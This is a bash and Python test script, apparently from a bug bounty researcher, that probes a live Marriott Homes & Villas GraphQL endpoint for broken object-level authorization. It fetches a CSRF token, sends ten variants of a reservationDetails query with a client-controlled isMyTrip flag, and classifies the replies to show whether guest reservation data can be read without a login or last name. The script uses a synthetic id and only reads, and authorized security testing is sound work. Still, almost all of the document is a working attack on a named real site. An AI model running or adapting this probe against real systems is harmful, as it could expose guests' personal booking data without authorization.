#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV reservationDetails: isMyTrip auth-flip test (session47)
# Portable: Linux / Pi / Termux.
#
# s46 revealed the real resolver signature:
#   reservationDetails(confirmation_id: ID!, checkin_date: String,
#     last_name: String, email: String, locale: String,
#     switchToPlatformAPI: Boolean, isMyTrip: Boolean)
# isMyTrip is a CLIENT-CONTROLLED boolean that flips the flow:
#   isMyTrip:true  = authenticated "My Trips" (authorized by SESSION, no last_name)
#   isMyTrip:false = public "find reservation" (needs last_name/checkin 2nd factor)
#
# HYPOTHESIS: sending isMyTrip:true UNAUTHENTICATED makes the resolver trust the
# client flag and return a reservation from confirmation_id alone (no session,
# no last_name) = broken object-level authorization.
#
# This is testable WITHOUT a real id: if the My-Trips path checks a session, an
# unauth isMyTrip:true request errors BEFORE the lookup (auth error visible even
# for a synthetic id). If it returns null with no error -> no session check on a
# path designed for authenticated users -> strong IDOR. We compare every flag
# variant's behavior with a SYNTHETIC id.
#
# SAFETY: SYNTHETIC confirmation id only. Read-only. No mutations. Stop on real PII.
#
# Run (Termux): OUTDIR=$HOME/s47 bash runbooks/PI-RUNBOOK-session47-hnv-ismytrip.sh \
#                 2>&1 | tee $HOME/s47/s47.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s47
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s47"
  else OUTDIR="$HOME/s47"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"; JAR="$OUTDIR/jar.txt"
export SYN="ZZTEST-0000-0000-NOTREAL"

echo "============================================================"
echo "HNV isMyTrip AUTH-FLIP  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR"; echo "============================================================"; echo ""

curl -s -o "$OUTDIR/home.html" -c "$JAR" -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" >/dev/null || true
TOK=$(grep -oE 'id="sourceid"[^>]*data-source="[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*data-source="([^"]+)".*/\1/')
[ -z "$TOK" ] && TOK=$(grep -oE '"csrfToken":"[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*:"([^"]+)"/\1/')
export TOK; echo "csrf token: ${TOK:0:30}..."; echo ""

# Build payloads in Python (clean escaping). Selection mirrors the real client.
python3 - << 'PYEOF'
import os,json
O=os.environ["OUTDIR"]; SYN=os.environ["SYN"]
SEL="guest_first_name guest_last_name property_name check_in_date check_out_date number_of_guests total currency reservation_status"
def payload(args, variables):
    return {"query":f"query R($c:ID!{args[0]}){{reservationDetails(confirmation_id:$c{args[1]}){{{SEL}}}}}",
            "variables":{"c":SYN, **variables}}
cases={
 "01-baseline":        payload(("",""), {}),
 "02-isMyTrip-true":   payload((", $m:Boolean",", isMyTrip:$m"), {"m":True}),
 "03-isMyTrip-false":  payload((", $m:Boolean",", isMyTrip:$m"), {"m":False}),
 "04-lastname":        payload((", $l:String",", last_name:$l"), {"l":"Testlastname"}),
 "05-checkin":         payload((", $d:String",", checkin_date:$d"), {"d":"2026-06-01"}),
 "06-email":           payload((", $e:String",", email:$e"), {"e":"qa@example.invalid"}),
 "07-switchPlatform":  payload((", $s:Boolean",", switchToPlatformAPI:$s"), {"s":True}),
 "08-myTrip+switch":   payload((", $m:Boolean, $s:Boolean",", isMyTrip:$m, switchToPlatformAPI:$s"), {"m":True,"s":True}),
 "09-myTrip+lastname": payload((", $m:Boolean, $l:String",", isMyTrip:$m, last_name:$l"), {"m":True,"l":"Testlastname"}),
 "10-full-client":     payload((", $d:String, $l:String, $e:String, $lo:String, $s:Boolean, $m:Boolean",
                                ", checkin_date:$d, last_name:$l, email:$e, locale:$lo, switchToPlatformAPI:$s, isMyTrip:$m"),
                               {"d":None,"l":None,"e":None,"lo":"en-US","s":False,"m":True}),
}
for k,v in cases.items(): json.dump(v, open(os.path.join(O,f"p-{k}.req"),"w"))
print(f"  built {len(cases)} variants")
PYEOF
echo ""

echo "═══ VARIANT BEHAVIOR (synthetic id) — watch for auth errors vs null ═══"
for f in "$OUTDIR"/p-*.req; do
  tag=$(basename "$f" .req); tag="${tag#p-}"
  read -r code size < <(curl -s -o "$OUTDIR/r-$tag.json" -b "$JAR" \
     -H "User-Agent: $UA" -H "$IDH" -H 'Content-Type: application/json' \
     -H 'Accept: application/json' -H "Origin: $B" -H "Referer: $B/" \
     -H "x-hvmi-csrf-token: $TOK" --max-time 20 --data @"$f" \
     -w '%{http_code} %{size_download}' "$B/gateway/graphql" 2>/dev/null || echo "000 0")
  body=$(cat "$OUTDIR/r-$tag.json")
  printf '  %-20s [%s %4sB] %s\n' "$tag" "$code" "$size" "$(echo "$body"|head -c 200|tr '\n' ' ')"
  sleep 0.4
done
echo ""

echo "════════════════════════════════════════════"
echo "DIFFERENTIAL ANALYSIS"
echo "════════════════════════════════════════════"
python3 - << 'PYEOF'
import os,glob,json
O=os.environ["OUTDIR"]
rows={}
for f in glob.glob(os.path.join(O,"r-*.json")):
    tag=os.path.basename(f)[2:-5]
    b=open(f,encoding="utf-8",errors="replace").read()
    rows[tag]=b
def cls(b):
    low=b.lower()
    if any(k in low for k in("unauthor","forbidden","not logged","login required","session","permission","access denied")):
        return "AUTH-ERROR"
    if '"errors"' in low and 'internal server error' in low: return "500-INTERNAL"
    if '"errors"' in low: return "GQL-ERROR"
    if '"reservationdetails":null' in low.replace(" ",""): return "null-object"
    if '"reservationdetails"' in low and '"data"' in low: return "object(null fields)"
    return "other"
print("  variant -> classification")
base=cls(rows.get("01-baseline",""))
for tag in sorted(rows):
    c=cls(rows[tag])
    flag=""
    if tag!="01-baseline" and c!=base: flag="  <-- DIFFERS from baseline"
    print(f"   {tag:20s} {c}{flag}")
print()
mt=cls(rows.get("02-isMyTrip-true",""))
if mt=="AUTH-ERROR":
    print("  >>> isMyTrip:true UNAUTH triggers an auth/session error.")
    print("  >>> The My-Trips path DOES check a session (good). The bug, if any, is")
    print("  >>> only confirmable via a real id on the find-reservation path.")
elif mt in ("object(null fields)","null-object"):
    print("  >>> isMyTrip:true UNAUTH executes with NO auth error (same as baseline).")
    print("  >>> The privileged My-Trips path has NO server-side session check — it")
    print("  >>> trusts the client isMyTrip flag. For a REAL confirmation_id this")
    print("  >>> likely returns the guest's data with NO last_name and NO login =")
    print("  >>> unauthenticated BOLA. Strong structural case; confirm with OWN id.")
else:
    print(f"  >>> isMyTrip:true -> {mt}. Inspect bodies; compare to baseline/false.")
print()
print("  Any variant that DIFFERS from baseline reveals server-side logic that")
print("  branches on that arg (enforcement). Note especially isMyTrip true vs false")
print("  and switchToPlatformAPI (it may route to a different backend with weaker authz).")
PYEOF
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
